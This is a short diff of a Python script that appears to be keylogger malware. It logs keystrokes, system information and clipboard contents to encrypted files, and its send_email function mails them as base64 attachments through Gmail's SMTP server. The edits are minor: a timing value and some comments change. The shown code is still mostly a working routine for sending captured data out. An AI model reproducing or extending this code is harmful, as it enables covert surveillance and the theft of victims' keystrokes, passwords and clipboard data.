@@ -50,7 +50,7 @@ enc_keys_info = "enc_key_log.txt"
 enc_system_info = "enc_systeminfo.txt"
 enc_clipboard_info = "enc_clipboardinfo.txt"
 
-time_iteration = 27 # each iteration to go on for 15 seconds
+time_iteration = 27 # each iteration to go on for 27 seconds
 num_of_iterations = 1 # number of iterations for 15 seconds each
 
 def send_email(filenames, attachments, toaddress):
@@ -68,10 +68,10 @@ def send_email(filenames, attachments, toaddress):
     # responsible for attaching the file to email
     for filename, attachment in zip(filenames, attachments):
         with open(attachment, 'rb') as att:
-            p = MIMEBase('application', 'octet-stream')
+            p = MIMEBase('application', 'octet-stream') 
             p.set_payload(att.read())  # Read the file in binary mode
             encoders.encode_base64(p)  # Encode the file to ASCII
-            p.add_header('Content-Disposition', f'attachment; filename={filename}')
+            p.add_header('Content-Disposition', f'attachment; filename={filename}') # tells the client it is an attachment
             msg.attach(p)
 
     s = smtplib.SMTP('smtp.gmail.com', 587) # initialize connection for tls encryption
